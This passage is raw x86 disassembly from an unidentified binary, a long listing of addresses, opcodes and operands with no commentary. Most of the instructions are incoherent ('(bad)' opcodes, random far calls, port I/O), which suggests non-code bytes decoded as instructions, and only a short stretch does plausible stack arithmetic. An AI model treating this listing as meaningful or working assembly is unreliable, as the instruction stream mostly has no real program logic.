  40c61d:	xchg   ebp,eax
  40c61e:	add    eax,0xe11a5a9f
  40c623:	mov    al,ds:0x38f2f527
  40c628:	add    eax,0xdb4d1ef0
  40c62d:	ss pop eax
  40c62f:	in     eax,0x6b
  40c631:	cmp    al,0xaa
  40c633:	pushf  
  40c634:	call   0xb78d70a8
  40c639:	std    
  40c63a:	add    al,0x83
  40c63c:	das    
  40c63d:	sbb    al,0xa7
  40c63f:	inc    esp
  40c640:	mov    al,ds:0xe82bf16a
  40c645:	hlt    
  40c646:	sbb    esi,eax
  40c648:	push   es
  40c649:	test   BYTE PTR [esi+0x14],ch
  40c64c:	(bad)  
  40c64e:	mov    eax,ds:0xb772417
  40c653:	mov    dh,0xc4
  40c655:	fsub   QWORD PTR [ebx-0x4f]
  40c658:	out    0x55,eax
  40c65a:	push   edx
  40c65b:	adc    BYTE PTR [edx],0xac
  40c65e:	cmp    eax,0xe1b4e90b
  40c663:	inc    edx
  40c664:	jmp    0x40c6a4
  40c666:	adc    cl,cl
  40c668:	xchg   esi,eax
  40c669:	mov    cl,cl
  40c66b:	ins    BYTE PTR es:[edi],dx
  40c66c:	shl    ebp,cl
  40c66e:	stos   DWORD PTR es:[edi],eax
  40c66f:	data16 mov dh,0xf7
  40c672:	je     0x40c65a
  40c674:	call   0xe7cc:0x75a024ba
  40c67b:	or     eax,0xe0c4bfa9
  40c680:	cmp    dl,BYTE PTR [ecx+eax*4+0x0]
  40c684:	or     DWORD PTR [esi+ebp*2-0x14c19345],ebp
  40c68b:	push   ecx
  40c68c:	shr    DWORD PTR [ecx+0x26],0xfc
  40c690:	shl    BYTE PTR [eax],1
  40c692:	fdivr  DWORD PTR [edi+0x5b4cb4e0]
  40c698:	xor    BYTE PTR [eax-0x56],bl
  40c69b:	test   al,0xd
  40c69d:	std    
  40c69e:	jle    0x40c65c
  40c6a0:	(bad)
  40c6a4:	mov    ebx,0x8773e304
  40c6a9:	mov    DWORD PTR [eax-0x7d8e902c],0x9fcd249b
  40c6b3:	mov    ebx,DWORD PTR [ebp+0x3ee87101]
  40c6b9:	fnsave [ebx+edi*1]
  40c6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6bd:	int    0xe8
  40c6bf:	add    eax,0x3ecdade3
  40c6c4:	xchg   ebp,eax
  40c6c5:	sub    dh,BYTE PTR [edi-0x3a1b6077]
  40c6cb:	daa    
  40c6cc:	xchg   ebp,eax
  40c6cd:	mov    ds:0x94fb7c14,al
  40c6d2:	push   ds
  40c6d3:	push   ss
  40c6d4:	inc    esp
  40c6d5:	mov    eax,0x11c22ce3
  40c6da:	push   ds
  40c6db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6dc:	pop    esi
  40c6dd:	and    al,0xe
  40c6df:	mov    al,0xd
  40c6e1:	fs mov ebp,0xb2e0d2ba
  40c6e7:	or     DWORD PTR ds:0x33bee67a,ecx
  40c6ed:	jl     0x40c68e
  40c6ef:	dec    ebp
  40c6f0:	sub    BYTE PTR [ebp-0x5e68855d],al
  40c6f6:	fnstcw WORD PTR [edx]
  40c6f8:	lahf   
  40c6f9:	jecxz  0x40c76e
  40c6fb:	push   esi
  40c6fc:	call   0x74b4:0x65cf0404
  40c703:	push   ebx
  40c704:	loope  0x40c735
  40c706:	out    dx,eax
  40c707:	xor    BYTE PTR [esi+0x30],cl
  40c70a:	mov    WORD PTR [eax+ebx*8],?
  40c70d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c70e:	sub    DWORD PTR [esp+eiz*8+0x38],edi
  40c712:	mov    ebx,0x59d49bd5
  40c717:	call   0x671360f7
  40c71c:	ds inc edi
  40c71e:	jg     0x40c6ee
  40c720:	shr    DWORD PTR [esi-0x49],1
  40c723:	test   al,0x12
  40c725:	xor    al,0xcf
  40c727:	shl    BYTE PTR [eax+0x1c],cl
  40c72a:	add    BYTE PTR [esi],dh
  40c72c:	dec    edi
  40c72d:	mov    ds:0xfbe6fbd8,al
  40c732:	std    
  40c733:	dec    esi
  40c734:	mov    ch,0xdd
  40c736:	lds    eax,FWORD PTR [edx-0x72]
  40c739:	xchg   BYTE PTR [ebx+eiz*4+0x15c21502],bl
  40c740:	test   esp,ecx
  40c742:	out    dx,eax
  40c743:	push   ecx
  40c744:	jmp    0x8eec:0xb007d03d
  40c74b:	shr    DWORD PTR [esi],0x83
  40c74e:	ja     0x40c6d8
  40c750:	mov    ds:0x14f0499,eax
  40c755:	push   edx
  40c756:	loopne 0x40c700
  40c758:	sbb    dh,BYTE PTR [edi+0x637e9a8f]
  40c75e:	lods   al,BYTE PTR ds:[esi]
  40c75f:	xchg   esi,eax
  40c760:	jnp    0x40c716
  40c762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c763:	outs   dx,BYTE PTR ds:[esi]
  40c764:	(bad)  
  40c765:	in     al,0x3a
  40c767:	fimul  DWORD PTR [eax+0x47088435]
  40c76d:	cli    
  40c76e:	div    BYTE PTR [edi]
  40c770:	test   BYTE PTR [esi-0x46ef4b32],bl
  40c776:	mov    eax,ds:0x17d812f3
  40c77b:	lock push es
  40c77d:	ror    BYTE PTR [eax],0x29
  40c780:	mov    cl,0x11
  40c782:	popa   
  40c783:	shl    BYTE PTR ds:0xcca28a74,cl
  40c789:	out    dx,al
  40c78a:	mov    eax,0x66f227c1
  40c78f:	sbb    BYTE PTR [eax+edi*4+0x224a70a8],bh
  40c796:	mov    ds:0xff36efbd,eax
  40c79b:	sbb    esi,DWORD PTR [edx]
  40c79d:	in     eax,0x64
  40c79f:	dec    eax
  40c7a0:	test   BYTE PTR [ebx],dh
  40c7a2:	pusha  
  40c7a3:	sar    edx,cl
  40c7a5:	add    al,0xe3
  40c7a7:	mov    ebx,0x4ca130f
  40c7ac:	(bad)  
  40c7ad:	push   esi
  40c7ae:	dec    ah
  40c7b0:	call   0xa8dd:0x86f0ef9e
  40c7b7:	push   es
  40c7b8:	dec    edx
  40c7b9:	mov    eax,0xd04ff45f
  40c7be:	jmp    0x40c778
  40c7c0:	add    ebx,DWORD PTR [ebx-0x128ff803]
  40c7c6:	xchg   edi,eax
  40c7c7:	cmc    
  40c7c8:	icebp  
  40c7c9:	test   eax,0x2633fd63
  40c7ce:	inc    edi
  40c7cf:	in     eax,dx
  40c7d0:	sub    BYTE PTR [esi*2-0x4147263e],bh
  40c7d7:	and    ah,0xc1
  40c7da:	nop
  40c7db:	pop    ecx
  40c7dc:	xor    eax,0xcb0d3f32
  40c7e1:	and    DWORD PTR [edx+0x651e5cd9],ebx
  40c7e7:	add    al,0x52
  40c7e9:	bound  esp,QWORD PTR [ebp+0x3fd0a39c]
  40c7ef:	arpl   WORD PTR [ecx-0x20],di
  40c7f2:	fmul   DWORD PTR [esi+0x51]
  40c7f5:	lods   eax,DWORD PTR ds:[esi]
  40c7f6:	loope  0x40c7ab
  40c7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7f9:	(bad)  
  40c7fa:	jne    0x40c83b
  40c7fc:	shr    DWORD PTR [edi+0x30],cl
  40c7ff:	xchg   esp,eax
  40c800:	iret   
  40c801:	loopne 0x40c786
  40c803:	adc    eax,0xfe4fe15f
  40c808:	adc    ebp,DWORD PTR [esi]
  40c80a:	fsubr  QWORD PTR [ecx+0x3a]
  40c80d:	sbb    eax,0xa0e44247
  40c812:	add    dh,ch
  40c814:	cdq    
  40c815:	adc    eax,DWORD PTR [ebx+eiz*8-0x60d6c60c]
  40c81c:	mov    edi,0x2700b737
  40c821:	push   es
  40c822:	mov    bl,0x20
  40c824:	lds    ebx,FWORD PTR [ebx+0x3d]
  40c827:	mov    ds:0xb7f23e9e,eax
  40c82c:	push   ecx
  40c82d:	js     0x40c7e8
  40c82f:	stos   BYTE PTR es:[edi],al
  40c830:	push   edi
  40c831:	ds stos DWORD PTR es:[edi],eax
  40c833:	sub    dl,dh
  40c835:	adc    DWORD PTR [esi-0x78],0xffffffc9
  40c839:	add    DWORD PTR [ebx-0x5e],eax
  40c83c:	mov    esi,0x62a1ae4a
  40c841:	and    al,0x7b
  40c843:	pop    ss
  40c844:	jb     0x40c8a4
  40c846:	cli    
  40c847:	push   0xb31cff4e
  40c84c:	js     0x40c808
  40c84e:	(bad)  
  40c84f:	aad    0x4f
  40c851:	mov    edx,0x8999010a
  40c856:	sub    al,0x9
  40c858:	mov    bl,0xb5
  40c85a:	mov    ds:0xe963fb4f,al
  40c85f:	repz clc 
  40c861:	mov    ebp,DWORD PTR [ecx-0x1583e3a2]
  40c867:	add    al,0x4f
  40c869:	sahf   
  40c86a:	mov    esp,0x45c7a750
  40c86f:	loopne 0x40c8ec
  40c871:	sub    al,BYTE PTR [eax]
  40c873:	add    bh,al
  40c875:	inc    ebp
  40c876:	in     al,0x8f
  40c878:	jno    0x40c87a
  40c87a:	add    BYTE PTR [ebx+0x6e9e045],cl
  40c880:	add    al,0x0
  40c882:	add    bh,bh
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0xabb4e3ac
  40c891:	out    dx,al
  40c892:	iret   
  40c893:	jmp    0x92ff876f
  40c898:	les    edi,FWORD PTR [esi-0x74c2c242]
  40c89e:	ret    
  40c89f:	jbe    0x40c8aa
  40c8a1:	call   0x6462:0x643974c0
  40c8a8:	(bad)  
  40c8a9:	cld    
  40c8aa:	or     al,0xab
  40c8ac:	cld    
  40c8ad:	loop   0x40c8b2
  40c8af:	jae    0x40c905
  40c8b1:	xchg   ebp,eax
  40c8b2:	outs   dx,BYTE PTR ds:[esi]
  40c8b3:	jl     0x40c92b
  40c8b5:	pop    eax
  40c8b6:	rcl    BYTE PTR [edi+0x5e8407e4],1
  40c8bc:	mov    DWORD PTR gs:[ebx],esi
  40c8bf:	pusha  
  40c8c0:	test   DWORD PTR [edx-0x449f057b],edi
  40c8c6:	xchg   ecx,eax
  40c8c7:	sbb    DWORD PTR [esi+0x583f3d65],0xfffffffb
  40c8ce:	mov    dh,0xa0
  40c8d0:	jecxz  0x40c888
  40c8d2:	(bad)  
  40c8d3:	int    0x1
  40c8d5:	jo     0x40c8d2
  40c8d7:	popa   
  40c8d8:	mov    BYTE PTR [ecx-0x4e0338a4],0xbd
  40c8df:	or     esi,edi
  40c8e1:	(bad)  
  40c8e3:	and    edx,eax
  40c8e5:	ins    BYTE PTR es:[edi],dx
  40c8e6:	cmc    
  40c8e7:	mov    ebp,0xe78f9bfc
  40c8ec:	mov    ebx,0x4c953967
  40c8f1:	mov    BYTE PTR [ebx],cl
  40c8f3:	out    0x7e,eax
  40c8f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8f6:	cmp    eax,0x21ac79bd
  40c8fb:	loope  0x40c8b3
  40c8fd:	rcl    BYTE PTR [edi+0x43],0xce
  40c901:	mov    cl,0xaf
  40c903:	repnz or eax,0xba6e53a7
  40c909:	lods   eax,DWORD PTR ds:[esi]
  40c90a:	out    0x56,al
  40c90c:	sbb    eax,0x2b76e853
  40c911:	push   DWORD PTR [ecx+0x7f]
  40c914:	shl    BYTE PTR [edx+0x7c441f17],0x3b
  40c91b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c91c:	das    
  40c91d:	adc    ebp,DWORD PTR [edi+0x29]
  40c920:	mov    edi,0x5a0e2d0b
  40c925:	jmp    0x40c8b4
  40c927:	loopne 0x40c8cf
  40c929:	loop   0x40c93e
  40c92b:	cmp    eax,DWORD PTR [ecx-0x79]
  40c92e:	cmp    DWORD PTR [ecx+0x4464a47],esi
  40c934:	mov    WORD PTR [edx],cs
  40c936:	icebp  
  40c937:	fiadd  DWORD PTR [ebx]
  40c939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c93a:	idiv   al
  40c93c:	mov    eax,ds:0xa23689c3
  40c941:	dec    ecx
  40c942:	mov    dl,0x60
  40c944:	aaa    
  40c945:	and    BYTE PTR [ebx],ch
  40c947:	xchg   DWORD PTR [ebx-0x68191871],esi
  40c94d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94e:	mov    cl,0xbc
  40c950:	aad    0x54
  40c952:	jnp    0x40c8ee
  40c954:	test   BYTE PTR [edx],dh
  40c956:	hlt    
  40c957:	int    0x27
  40c959:	cs leave 
  40c95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c95c:	adc    ch,BYTE PTR [esi-0xb14a8bb]
  40c962:	call   0x1e0af848
  40c967:	mov    DWORD PTR [ecx],eax
  40c969:	sub    edi,DWORD PTR [eax-0x29]
  40c96c:	xchg   ebx,eax
  40c96d:	in     al,dx
  40c96e:	out    dx,al
  40c96f:	out    0xed,eax
  40c971:	inc    edi
  40c972:	xlat   BYTE PTR ds:[ebx]
  40c973:	div    BYTE PTR [esi+eax*2+0x4bde5d02]
  40c97a:	rcr    BYTE PTR [esi-0x6e3f9bd2],1
  40c980:	pop    edx
  40c981:	test   BYTE PTR [ebp-0x15],dh
  40c984:	sub    DWORD PTR [edi-0x4a],edx
  40c987:	ds inc edx
  40c989:	test   al,0x82
  40c98b:	jg     0x40c92f
  40c98d:	inc    edi
  40c98e:	cmc    
  40c98f:	arpl   WORD PTR [eax+0x2],sp
  40c992:	cmp    ebp,DWORD PTR [edx]
  40c994:	shr    BYTE PTR ds:0x457116bb,cl
  40c99a:	shl    DWORD PTR [edi-0x5bb9d06c],cl
  40c9a0:	or     DWORD PTR ds:0x5e63b50a,ebx
  40c9a6:	jno    0x40ca07
  40c9a8:	(bad)  
  40c9a9:	xor    DWORD PTR ds:0x4fa809c8,ebp
  40c9af:	xchg   ebx,eax
  40c9b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b1:	jle    0x40c971
  40c9b3:	cmp    eax,0x639ea61f
  40c9b8:	(bad)  
  40c9b9:	stc    
  40c9ba:	push   ebx
  40c9bb:	dec    ebp
  40c9bc:	xchg   ebx,eax
  40c9bd:	mov    dl,0x3d
  40c9bf:	in     al,0xce
  40c9c1:	lea    edi,[eax]
  40c9c3:	xor    ebp,DWORD PTR [ecx-0x4]
  40c9c6:	cmp    cl,BYTE PTR [edx-0x5ebf7bbd]
  40c9cc:	aas    
  40c9cd:	push   esi
  40c9ce:	fucom  st(2)
  40c9d0:	mov    bl,0x2c
  40c9d2:	lds    eax,FWORD PTR [ebx+0x46]
  40c9d5:	xor    al,0xdf
  40c9d7:	push   cs
  40c9d8:	xor    DWORD PTR [edx+ecx*4],esi
  40c9db:	and    ecx,DWORD PTR [esi]
  40c9dd:	jns    0x40ca5b
  40c9df:	and    al,0xdd
  40c9e1:	aas    
  40c9e2:	aam    0x52
  40c9e4:	sub    ebp,DWORD PTR [edi]
  40c9e6:	adc    ch,BYTE PTR [edi-0x1]
  40c9e9:	fimul  DWORD PTR [ebx+0x640b54e6]
  40c9ef:	mov    cl,0x46
  40c9f1:	rol    BYTE PTR [edi-0x7caa31ce],cl
  40c9f7:	and    eax,0x3768355a
  40c9fc:	scas   eax,DWORD PTR es:[edi]
  40c9fd:	or     eax,0x2206fabc
  40ca02:	xchg   bh,dl
  40ca04:	out    0x4d,eax
  40ca06:	xchg   DWORD PTR [eax],ebp
  40ca08:	push   ss
  40ca09:	xlat   BYTE PTR ds:[ebx]
  40ca0a:	int3   
  40ca0b:	xlat   BYTE PTR ds:[ebx]
  40ca0c:	rcl    edx,0xf3
  40ca0f:	pop    esi
  40ca10:	shl    DWORD PTR ds:0x8426a1ef,1
  40ca16:	cmp    esp,edi
  40ca18:	neg    ch
  40ca1a:	pusha  
  40ca1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1c:	sbb    DWORD PTR [ebp+0x25],ebx
  40ca1f:	mov    eax,0xa09a2fba
  40ca24:	les    esp,FWORD PTR [edx+0x5]
  40ca27:	mov    edx,0x7e6642fb
  40ca2c:	and    BYTE PTR [esi],0x70
  40ca2f:	jl     0x40c9c0
  40ca31:	and    eax,0xc414a709
  40ca36:	xor    al,0xff
  40ca38:	and    al,0xb0
  40ca3a:	inc    ebp
  40ca3b:	jle    0x40ca09
  40ca3d:	loopne 0x40ca83
  40ca3f:	xchg   edi,eax
  40ca40:	dec    edx
  40ca41:	retf   0x8f5f
  40ca44:	mov    bl,0x68
  40ca46:	xchg   edi,eax
  40ca47:	xor    cl,bh
  40ca49:	(bad)  
  40ca4a:	rol    DWORD PTR [esi+ebx*4],1
  40ca4d:	arpl   WORD PTR [esi+0x4d],bx
  40ca50:	scas   al,BYTE PTR es:[edi]
  40ca51:	adc    DWORD PTR [edi+ebx*2+0x779039ec],0xbb262f67
  40ca5c:	jge    0x40c9ea
  40ca5e:	push   cs
  40ca5f:	leave  
  40ca60:	loopne 0x40ca5b
  40ca62:	int3   
  40ca63:	pushf  
  40ca64:	mov    ch,0x53
  40ca66:	jbe    0x40cab6
  40ca68:	and    ebx,DWORD PTR [edx]
  40ca6a:	or     eax,0xbcd89a51
  40ca6f:	data16 fmul DWORD PTR [esi+0x461caae9]
  40ca76:	inc    ebp
  40ca77:	call   0xc831:0x3ddd6827
  40ca7e:	dec    ebx
  40ca7f:	adc    cl,BYTE PTR ds:0x3a102b7c
  40ca85:	ja     0x40cade
  40ca87:	or     ebx,DWORD PTR [esi+0x4003b96]
  40ca8d:	jle    0x40caca
  40ca8f:	pop    eax
  40ca90:	sbb    ebp,DWORD PTR [ebx-0x4388be19]
  40ca96:	(bad)  
  40ca97:	std    
  40ca98:	adc    DWORD PTR [eax-0x7d78feae],ebx
  40ca9e:	ins    DWORD PTR es:[edi],dx
  40ca9f:	repz mov ds:0x5f9dc937,al
  40caa5:	lea    esi,[ebp+ebp*1+0x77]
  40caa9:	xchg   esi,eax
  40caaa:	inc    edi
  40caab:	sub    DWORD PTR [esi-0x3f],ebx
  40caae:	les    esi,FWORD PTR [eax+0x73b8d456]
  40cab4:	jbe    0x40cb09
  40cab6:	stos   BYTE PTR es:[edi],al
  40cab7:	pop    ss
  40cab8:	push   0xffffff93
  40caba:	pop    esp
  40cabb:	sbb    ch,dl
  40cabd:	fadd   DWORD PTR [eax+0x73db7780]
  40cac3:	lock dec edi
  40cac5:	loop   0x40cab3
  40cac7:	xchg   ecx,edx
  40cac9:	lods   al,BYTE PTR ds:[esi]
  40caca:	ins    WORD PTR es:[edi],dx
  40cacc:	dec    esp
  40cacd:	pop    ds
  40cace:	xchg   ebp,eax
  40cacf:	and    DWORD PTR [ebp+eiz*8+0x38],0x51
  40cad4:	iret   
  40cad5:	inc    edx
  40cad6:	jp     0x40cb44
  40cad8:	jecxz  0x40cb57
  40cada:	inc    edx
  40cadb:	(bad)  [ebx+0x6d3a76c]
  40cae1:	les    esi,FWORD PTR [ebx+0x60]
  40cae4:	pop    ss
  40cae5:	fldenv [esi-0x2d]
  40cae8:	mov    bh,ch
  40caea:	or     al,0x1f
  40caec:	pop    ds
  40caed:	call   0x9bbb:0x14337702
  40caf4:	adc    al,0x9f
  40caf6:	add    ecx,esi
  40caf8:	lea    edi,[ecx-0x17]
  40cafb:	ror    DWORD PTR [edx],1
  40cafd:	mov    edx,0xb1b7a0f7
  40cb02:	push   edx
  40cb03:	cs jmp 0x40cb33
  40cb06:	xchg   edi,eax
  40cb07:	fs jp  0x40cb33
  40cb0a:	cmp    dl,bl
  40cb0c:	enter  0x182d,0xf0
  40cb10:	mov    DWORD PTR ds:0x4b733231,eax
  40cb16:	push   cs
  40cb17:	mov    al,ds:0xec87d99b
  40cb1c:	outs   dx,DWORD PTR ds:[esi]
  40cb1d:	fbstp  TBYTE PTR ss:[esi-0x33afc5a]
  40cb24:	fst    DWORD PTR [edx]
  40cb26:	adc    BYTE PTR [edx+0x24cb00bc],0x49
  40cb2d:	jge    0x40cb15
  40cb2f:	pop    es
  40cb30:	ret    
  40cb31:	test   cl,dl
  40cb33:	nop
  40cb34:	in     eax,0x38
  40cb36:	adc    ah,BYTE PTR [edi+ebp*2]
  40cb39:	inc    edx
  40cb3a:	mov    edx,0x637c11c8
  40cb3f:	out    dx,al
  40cb40:	push   ebx
  40cb41:	or     ebx,DWORD PTR [ebp+0x63]
  40cb44:	pop    edx
  40cb45:	sbb    ebp,DWORD PTR [edi-0x19]
  40cb48:	cmp    eax,edx
  40cb4a:	in     al,0x52
  40cb4c:	std    
  40cb4d:	cmp    eax,0x8414e53b
  40cb52:	mov    bh,0x61
  40cb54:	mov    eax,0xbfdc8849
  40cb59:	dec    ebp
  40cb5a:	add    eax,0xa5be9fd2
  40cb5f:	or     al,BYTE PTR [ebx-0xb]
  40cb62:	popa   
  40cb63:	loop   0x40cba1
  40cb65:	xor    al,0xc2
  40cb67:	push   esp
  40cb68:	push   esi
  40cb69:	nop
  40cb6a:	data16 jnp 0x40cbd2
  40cb6d:	xlat   BYTE PTR ds:[ebx]
  40cb6e:	sbb    al,0xfc
  40cb70:	xchg   esi,eax
  40cb71:	pop    ecx
  40cb72:	(bad)  
  40cb73:	pop    ecx
  40cb74:	mov    dl,0xf2
  40cb76:	imul   esi,esi,0x5ca794cc
  40cb7c:	mov    eax,ds:0x56ffd1c1
  40cb81:	ja     0x40cb71
  40cb83:	mov    ch,ch
  40cb85:	mov    cl,0x17
  40cb87:	gs inc esi
  40cb89:	gs xchg esi,eax
  40cb8b:	ds stos DWORD PTR es:[edi],eax
  40cb8d:	aas    
  40cb8e:	jne    0x40cb7e
  40cb90:	retf   
  40cb91:	push   ecx
  40cb92:	or     ebp,DWORD PTR [ebx]
  40cb94:	cmp    al,0x1b
  40cb96:	clc    
  40cb97:	out    0x7e,eax
  40cb99:	ror    ebp,cl
  40cb9b:	jns    0x40cb6f
  40cb9d:	pop    edi
  40cb9e:	mov    ah,BYTE PTR [esi]
  40cba0:	push   0x9
  40cba2:	xor    al,0x11
  40cba4:	adc    al,BYTE PTR [edx]
  40cba6:	inc    ecx
  40cba7:	test   DWORD PTR [ebx+ecx*1+0x29],eax
  40cbab:	and    al,0x8f
  40cbad:	cmp    al,0x2a
  40cbaf:	imul   edx,DWORD PTR [edx+0x175baab2],0xec9fb851
  40cbb9:	and    eax,0x4c5dd19b
  40cbbe:	nop
  40cbbf:	pop    esp
  40cbc0:	lea    edi,[bp+si-0x60]
  40cbc4:	xor    esi,edx
  40cbc6:	retf   
  40cbc7:	and    edi,DWORD PTR [eax+0x1c]
  40cbca:	jmp    0x40cb8c
  40cbcc:	cmp    DWORD PTR [edi-0x150a1a60],0x484d69b0
  40cbd6:	fcomp  DWORD PTR [ecx+0x41]
  40cbd9:	cmp    ch,bl
  40cbdb:	mov    edx,0xadbaa709
  40cbe0:	dec    edi
  40cbe1:	sbb    edi,DWORD PTR [ebx-0x7]
  40cbe4:	xor    al,0xc0
  40cbe6:	dec    edi
  40cbe7:	je     0x40cb6b
  40cbe9:	jno    0x40cc5b
  40cbeb:	or     DWORD PTR [ecx+0x64],ebx
  40cbee:	mov    ecx,DWORD PTR [ebx]
  40cbf0:	sub    BYTE PTR [eax],ah
  40cbf2:	push   0xa37d07ab
  40cbf7:	repz scas eax,DWORD PTR es:[edi]
  40cbf9:	jge    0x40cc74
  40cbfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbfc:	xchg   edx,eax
  40cbfd:	pop    ss
  40cbfe:	or     eax,0x8c6181fc
  40cc03:	lea    ecx,[ebp-0x12801f63]
  40cc09:	call   0xe5c7:0xb4474d17
  40cc10:	push   ebx
  40cc11:	daa    
  40cc12:	sbb    esp,DWORD PTR [eax+0x13]
  40cc15:	jmp    0x4195:0xf35aaeb4
  40cc1c:	fldenv [ebp+0x68c0862c]
  40cc22:	jmp    0xe20071aa
  40cc27:	inc    eax
  40cc28:	sahf   
  40cc29:	xchg   ebx,eax
  40cc2a:	ror    DWORD PTR [bp+di],0x87
  40cc2e:	mov    cl,0x41
  40cc30:	hlt    
  40cc31:	pop    eax
  40cc33:	mov    cl,BYTE PTR [eax-0x47]
  40cc36:	outs   dx,BYTE PTR ds:[esi]
  40cc37:	push   eax
  40cc38:	cdq    
  40cc39:	(bad)  
  40cc3b:	inc    edi
  40cc3c:	adc    ebx,DWORD PTR [edi]
  40cc3e:	jecxz  0x40cc83
  40cc40:	das    
  40cc41:	mov    ch,0xcd
  40cc43:	in     al,0x4f
  40cc45:	pop    ss
  40cc46:	pop    eax
  40cc47:	dec    ebx
  40cc48:	or     BYTE PTR [ebx],bl
  40cc4a:	das    
  40cc4b:	int    0xc0
  40cc4d:	out    dx,eax
  40cc4e:	mov    esp,0xde5e541a
  40cc53:	jae    0x40cc89
  40cc55:	pushf  
  40cc56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc57:	sbb    al,0xfe
  40cc59:	or     BYTE PTR [edi-0x7704be77],dh
  40cc5f:	stos   BYTE PTR es:[edi],al
  40cc60:	mov    ebp,edi
  40cc62:	(bad)  
  40cc63:	popa   
  40cc64:	inc    ecx
  40cc65:	mov    ds:0x7bd50e4,al
  40cc6a:	add    esi,DWORD PTR [edi]
  40cc6c:	add    DWORD PTR [ebp-0x2d],0x8
  40cc70:	pop    ds
  40cc71:	fdivp  st(2),st
  40cc73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc74:	sub    ah,BYTE PTR [edx+0x3c46b935]
  40cc7a:	das    
  40cc7b:	mov    ah,0xe8
  40cc7d:	xlat   BYTE PTR ds:[ebx]
  40cc7e:	add    bh,ah
  40cc80:	pop    edi
  40cc81:	ja     0x40cca5
  40cc83:	push   ds
  40cc84:	daa    
  40cc85:	push   esp
  40cc86:	xlat   BYTE PTR ds:[ebx]
  40cc87:	push   es
  40cc88:	aad    0x8b
  40cc8a:	push   ebp
  40cc8b:	in     al,0x8b
  40cc8d:	jne    0x40cc67
  40cc8f:	mov    ebx,DWORD PTR [ebp-0x24]
  40cc92:	add    eax,0xffffc948
  40cc97:	adc    edx,0xffff87b0
  40cc9d:	or     eax,esi
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40cc79
  40ccd6:	es jmp 0xbf208abf
  40ccdc:	mov    esi,0xbebec492
  40cce1:	jge    0x40cd3c
  40cce3:	jne    0x40cc79
  40cce5:	pop    esp
  40cce6:	inc    esi
  40cce7:	loop   0x40ccec
  40cce9:	popa   
  40ccea:	iret   
  40cceb:	mov    esi,0x8a724e39
  40ccf0:	out    0x30,eax
  40ccf2:	loopne 0x40cce5
  40ccf4:	cmp    ecx,DWORD PTR [ecx-0x2ff16887]
  40ccfa:	mov    esi,0x9258be95
  40ccff:	xor    ebx,eax
  40cd01:	fist   WORD PTR [ebx+0x7b]
  40cd04:	in     eax,dx
  40cd05:	mov    ah,0x6c
  40cd07:	retf   0x3972
  40cd0a:	or     eax,0xfb161025
  40cd0f:	sti    
  40cd10:	dec    edi
  40cd11:	cmp    ebp,DWORD PTR [ebx]
  40cd13:	cmp    eax,0x4018bb07
  40cd18:	(bad)  
  40cd19:	jp     0x40cd00
  40cd1b:	cmc    
  40cd1c:	xor    ecx,ecx
  40cd1e:	repnz shl dl,cl
  40cd21:	xor    eax,0xcd40a16c
  40cd26:	sbb    edi,DWORD PTR [eax-0x773a8856]
  40cd2c:	inc    esp
  40cd2d:	nop
  40cd2e:	inc    eax
  40cd2f:	inc    ecx
  40cd30:	cmp    esi,DWORD PTR [ebp-0x5e]
  40cd33:	cwde   
  40cd34:	test   al,0x23
  40cd36:	dec    edi
  40cd37:	hlt    
  40cd38:	push   0x56
  40cd3a:	ret    0xcf8e
  40cd3d:	push   ebx
  40cd3e:	adc    edx,DWORD PTR [esp+eiz*2+0xf0a8d31]
  40cd45:	pop    ecx
  40cd46:	xor    BYTE PTR [edi],0xa3
  40cd49:	jmp    0x40ccd8
  40cd4b:	cs dec ecx
  40cd4d:	mov    dh,0x3b
  40cd4f:	in     al,dx
  40cd50:	xor    edx,ebx
  40cd52:	fdivr  QWORD PTR [ebp+0x3f]
  40cd55:	or     eax,0xf4df17f0
  40cd5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd5b:	ins    DWORD PTR es:[edi],dx
  40cd5c:	in     al,0x7d
  40cd5e:	xchg   ecx,eax
  40cd5f:	add    al,0x8d
  40cd61:	sbb    eax,0x765705e2
  40cd66:	dec    ecx
  40cd67:	inc    edx
  40cd68:	das    
  40cd69:	sub    BYTE PTR [edx-0x35c3dc0a],bl
  40cd6f:	cmp    al,0x77
  40cd71:	loop   0x40cd6e
  40cd73:	pop    ds
  40cd74:	jl     0x40cdaa
  40cd76:	stos   DWORD PTR es:[edi],eax
  40cd77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd78:	jne    0x40cdf4
  40cd7a:	out    dx,eax
  40cd7b:	dec    ecx
  40cd7c:	mov    ds:0xbf5a8c88,al
  40cd81:	fistp  QWORD PTR [ecx+0x78]
  40cd84:	cmc    
  40cd85:	fnstenv [esp+edi*1+0xa3e130b]
  40cd8c:	push   ecx
